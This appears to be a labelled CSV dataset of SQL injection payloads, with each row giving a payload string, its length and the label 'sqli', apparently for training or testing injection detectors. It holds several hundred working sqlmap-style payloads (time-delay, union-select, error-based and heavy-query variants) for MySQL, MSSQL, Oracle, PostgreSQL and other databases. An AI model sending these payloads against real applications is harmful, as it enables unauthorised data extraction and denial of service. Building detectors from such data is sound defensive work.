payload,length,attack_type
"iif(3204=8489,3204,1/0)",23,sqli
"-5292') union all select 1439,1439,1439,1439#",45,sqli
"-1407 where 1186=1186 union all select 1186,1186,1186,1186,1186--",65,sqli
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",51,sqli
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,213,sqli
"-3109"" or elt(1032=1032,3623)",29,sqli
1' order by 1#,14,sqli
1)) as wwkw where 7289=7289 and 7533=7533--,43,sqli
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,223,sqli
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('trdf' like 'trdf",226,sqli
"1"" where 7371=7371 waitfor delay '0:0:5'--",42,sqli
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",60,sqli
-9178') or 9779=6351,20,sqli
"1"") as htyo where 8322=8322 and 4595=4595#",42,sqli
"1"") as mwja where 7881=7881 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",231,sqli
"-5024%"" or make_set(3321=7355,7355) and ""%""=""",45,sqli
-3634%')) or 2671=2434,22,sqli
1'))) union all select null#,28,sqli
1) and (select * from (select(sleep(5)))fzno),45,sqli
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",171,sqli
"-7448 union all select 4072,4072#",33,sqli
"1""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli
1')) rlike (select * from (select(sleep(5)))sgvo) and (('pemj'='pemj,68,sqli
1%')));if(9770=9748) select 9770 else drop function zyuo--,58,sqli
"1')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,sqli
1') where 4364=4364 and 8594=(select 8594 from pg_sleep(5))--,61,sqli
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",223,sqli
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('jicq' like 'jicq",201,sqli
"-9854) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (5696=5696",216,sqli
1%')));begin dbms_lock.sleep(5); end--,38,sqli
-7726 or 3038=3038,18,sqli
"1 and elt(4249=4249,7259)",25,sqli
"1) where 8008=8008 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",63,sqli
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""bvdv"" like ""bvdv",131,sqli
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",92,sqli
1' where 1692=1692;begin dbms_lock.sleep(5); end--,50,sqli
"1'||(select 'asfl' from dual where 5846=5846 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",120,sqli
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",222,sqli
"-8153' where 2436=2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",90,sqli
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)# usus",97,sqli
"1"" union all select null,null,null,null,null,null,null,null#",60,sqli
"1%'));iif(5519=4796,1,1/0)",26,sqli
-1648)) as oqqy where 3459=3459 or 6872=6872--,46,sqli
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('wsmq'='wsmq",126,sqli
"1"")) as upvg where 4826=4826;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",129,sqli
"1""))) union all select null,null,null,null--",44,sqli
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",49,sqli
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",74,sqli
-8233' or 9538=1882#,20,sqli
"1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",65,sqli
"1'+(select 'ndpx' where 4061=4061 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",135,sqli
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",114,sqli
"1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",164,sqli
"-9240' union all select 6538,6538,6538#",39,sqli
"1))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((6312=6312",95,sqli
"-6360') as yfrk where 3683=3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",94,sqli
"-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",77,sqli
"1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))",108,sqli
1') and (3020=3020)*6703 and ('botl' like 'botl,47,sqli
1%')) and 3721=2597#,20,sqli
1') and 2564=3234--,19,sqli
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'ytlf'='ytlf",108,sqli
"1%' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",106,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",124,sqli
"1%""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""%""=""",121,sqli
"1) where 8164=8164 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",125,sqli
"1"")) and sleep(5) and ((""lied"" like ""lied",41,sqli
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,113,sqli
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,78,sqli
"-8069)) as sxbn where 7689=7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",100,sqli
"1'+(select snam where 1993=1993;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",99,sqli
"elt(2567=9921,9921)",19,sqli
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",55,sqli
1') as wquy where 2518=2518;select sleep(5)#,44,sqli
"-1432"")) union all select 9008,9008,9008#",41,sqli
1') or (select * from (select(sleep(5)))ydpu) and ('brob'='brob,63,sqli
-1854') as fmmq where 7326=7326 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,219,sqli
1) as bidc where 5268=5268 and (select * from (select(sleep(5)))fzno)--,71,sqli
-8701%')) or (4843=1690)*1690 and (('%'=',41,sqli
"-1503"" order by 1--",19,sqli
"1"")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--",57,sqli
-8836%') or 4856=3891,21,sqli
"1%"" union all select null,null,null,null,null,null,null#",56,sqli
"-1512 union all select 9013,9013,9013,9013#",43,sqli
1';if(4947=5350) select 4947 else drop function ereg--,54,sqli
-1011 or 7140=9977--,20,sqli
"1 where 2292=2292 union all select null,null,null,null#",55,sqli
-8187'))) or 1698=2823#,23,sqli
"1%""))) and 4595=4595#",21,sqli
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",103,sqli
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",85,sqli
"-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",117,sqli
"1""))) union all select null,null,null,null,null,null,null,null,null--",69,sqli
"1"" and (7424=2381)*2381 and ""dvju""=""dvju",40,sqli
"1"";select sleep(5) and ""irxg""=""irxg",35,sqli
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw",136,sqli
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",81,sqli
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",97,sqli
1') and (2763=4004)*4004 and ('dtts'='dtts,42,sqli
-2707'))) or (8459=8459)*4906 and ((('mwdq'='mwdq,49,sqli
1'+(select 'vidl' where 9445=9445 and 5498=5777#,48,sqli
1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,70,sqli
"1""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",113,sqli
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",95,sqli
"-3609"")) as fzyp where 9474=9474 or 9323=9323#",46,sqli
-6412%' or 4065=5815 and '%'=',30,sqli
"-5355"" or make_set(9354=9354,7185)",34,sqli
"1'+(select 'mdiu' where 4443=4443;select benchmark(5000000,md5(0x4c4d6142)))+'",78,sqli
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",70,sqli
"1"") as fcrx where 2929=2929 and 2820=5133",41,sqli
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",125,sqli
1')) and 7533=7533 and (('ialm'='ialm,37,sqli
"1)) as vmwj where 5597=5597;iif(5257=5257,1,1/0)",48,sqli
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",101,sqli
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",158,sqli
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",218,sqli
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",68,sqli
1) as ryks where 1196=1196;select (case when (1005=5996) then 1 else 1005*(select 1005 from master..sysdatabases) end)--,120,sqli
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",77,sqli
"1' where 8864=8864;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,sqli
"1') where 7391=7391 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",191,sqli
"-3805""))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",67,sqli
"1' in boolean mode) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,sqli
-4055')) as yoez where 3816=3816 or (8459=8459)*4906--,54,sqli
"1'||(select 'ysij' from dual where 6140=6140 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||'",138,sqli
"1'+(select 'qmtx' where 6992=6992 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",96,sqli
1);begin dbms_lock.sleep(5); end,32,sqli
"1 where 3410=3410 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",124,sqli
"-4596"" union all select 5761#",29,sqli
"1%""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",99,sqli
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",73,sqli
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli
"1'+(select 'arzm' where 6464=6464 or 8466=benchmark(5000000,md5(0x694a4745)))+'",79,sqli
"-3081""))) or 3736=1899",22,sqli
"1')) as umah where 3781=3781 union all select null,null,null,null#",66,sqli
1' and (3020=3020)*6703,23,sqli
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,116,sqli
"1) where 4573=4573;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",106,sqli
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",93,sqli
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",121,sqli
"1%' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",112,sqli
"-8301') union all select 1806,1806--",36,sqli
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",161,sqli
-8729'+(select 'nbzl' where 7160=7160 order by 1#,49,sqli
-4713'))) or 4567=1287,22,sqli
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",54,sqli
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,209,sqli
-7772')) or 9323=9323#,22,sqli
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""znzb"" like ""znzb",216,sqli
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))# lchh",66,sqli
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",75,sqli
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""uhvy""=""uhvy",65,sqli
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",93,sqli
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",147,sqli
-2992%'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',221,sqli
"1) where 1443=1443 union all select null,null,null,null,null#",61,sqli
-1662 where 1119=1119 or (8459=8459)*4906--,43,sqli
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",83,sqli
"1%' union all select null,null,null,null,null,null--",52,sqli
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",78,sqli
"1"")) as knyf where 8109=8109 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",90,sqli
"1"")));select count(*) from generate_series(1,5000000)--",55,sqli
1' and 7533=7533 and 'jwgc'='jwgc,33,sqli
"1"");waitfor delay '0:0:5'--",27,sqli
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",116,sqli
"1"") as ztkr where 1532=1532;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",111,sqli
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",116,sqli
"1""))) union all select null,null,null,null,null,null,null,null#",63,sqli
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",50,sqli
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",86,sqli
"1"" where 1831=1831 and (select * from (select(sleep(5)))gcrr)#",62,sqli
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",122,sqli
-6984 order by 1#,17,sqli
"1')) union all select null,null,null#",37,sqli
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('xhez' like 'xhez",222,sqli
"1"") where 9020=9020 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",222,sqli
"1 and elt(1210=1210,sleep(5))# macc",35,sqli
"1"")) union all select null,null,null,null--",43,sqli
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,58,sqli
"1')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",142,sqli
"1'+(select fhbk where 2570=2570 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",131,sqli
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt,86,sqli
"-7255' union all select 2127,2127,2127,2127,2127#",49,sqli
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,73,sqli
"-3525"" where 3522=3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",85,sqli
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",78,sqli
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""lsis"" like ""lsis",65,sqli
"-8331') union all select 1452,1452,1452,1452,1452--",51,sqli
"-6775"" union all select 7484,7484#",34,sqli
"1"")) as tkmd where 3415=3415 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",186,sqli
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('fvov'='fvov",119,sqli
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",87,sqli
"1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--",90,sqli
"-2790') as xhct where 5756=5756 union all select 5756,5756#",59,sqli
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",93,sqli
1)) waitfor delay '0:0:5' and ((1636=1636,41,sqli
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (4703=4703,198,sqli
"1"") where 2702=2702 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",96,sqli
"-3555') or make_set(9354=9354,7185) and ('papr'='papr",53,sqli
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""ypoj""=""ypoj",177,sqli
"1)) as oqfr where 6426=6426 and make_set(8403=8403,8899)--",58,sqli
1' where 6359=6359 and (3020=3020)*6703--,41,sqli
1'+(select pagd where 2484=2484;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,96,sqli
"1 union all select null,null,null,null,null,null,null,null,null#",64,sqli
"-2987"") as iyob where 7827=7827 or (8459=8459)*4906--",53,sqli
1 waitfor delay '0:0:5'-- nnnp,30,sqli
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""ardk"" like ""ardk",211,sqli
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""giuq""=""giuq",83,sqli
"1"" where 4281=4281;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",106,sqli
"1"")) rlike (select (case when (5342=1036) then 1 else 0x28 end)) and ((""ntdz"" like ""ntdz",88,sqli
"-9087"" order by 1#",18,sqli
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",84,sqli
1%') order by 1#,16,sqli
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",132,sqli
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,225,sqli
-8359) where 4430=4430 or 6872=6872--,37,sqli
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",49,sqli
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",124,sqli
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",183,sqli
"1"")) as zemm where 3324=3324 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",102,sqli
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",55,sqli
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",89,sqli
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('hbld'='hbld",124,sqli
"1"")) or (select * from (select(sleep(5)))sddo)#",47,sqli
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",120,sqli
1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--,66,sqli
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",120,sqli
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,83,sqli
"-5052))) union all select 8351,8351,8351,8351#",46,sqli
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",79,sqli
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",108,sqli
"1""));if(7899=7899) select 7899 else drop function zbbp--",56,sqli
"-6772"")) or 9323=9323#",22,sqli
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",115,sqli
"1'))) union all select null,null,null,null,null,null,null,null,null#",68,sqli
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli
"-3300' union all select 8979,8979,8979,8979,8979,8979--",55,sqli
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",110,sqli
"1) as vqdh where 1603=1603;iif(4436=8910,1,1/0)",47,sqli
"-8608"" or 5460=4461--",21,sqli
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",58,sqli
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""ubvd""=""ubvd",64,sqli
"1%' or elt(6272=6272,sleep(5)) and '%'='",40,sqli
"elt(5953=5953,1)",16,sqli
1%')) rlike (select (case when (6094=7893) then 1 else 0x28 end)) and (('%'=',77,sqli
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",113,sqli
-8404)) order by 1--,20,sqli
"1"") and 2006=2006",17,sqli
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,214,sqli
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",102,sqli
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('etzb'='etzb",140,sqli
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",101,sqli
1'))) and 8594=(select 8594 from pg_sleep(5))--,47,sqli
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",93,sqli
"1"") and make_set(4539=6401,6401) and (""kglx""=""kglx",50,sqli
"-5859) as ernq where 8394=8394 union all select 8394,8394,8394--",64,sqli
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",105,sqli
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",64,sqli
"1' or elt(6272=6272,sleep(5))",29,sqli
-6095') or 6872=6872 and ('bfwm' like 'bfwm,43,sqli
-8465' where 5242=5242 or 3806=7423--,37,sqli
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",106,sqli
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('kufi'='kufi",113,sqli
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",73,sqli
"1,(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",169,sqli
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,72,sqli
"-2111' union all select 1061,1061,1061--",40,sqli
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp",67,sqli
"1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#",60,sqli
"1"") where 2215=2215 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",253,sqli
1));select (case when (9103=9836) then 9103 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli
(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end)),93,sqli
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,230,sqli
"1"")) as vhrq where 1690=1690 and elt(1210=1210,sleep(5))--",58,sqli
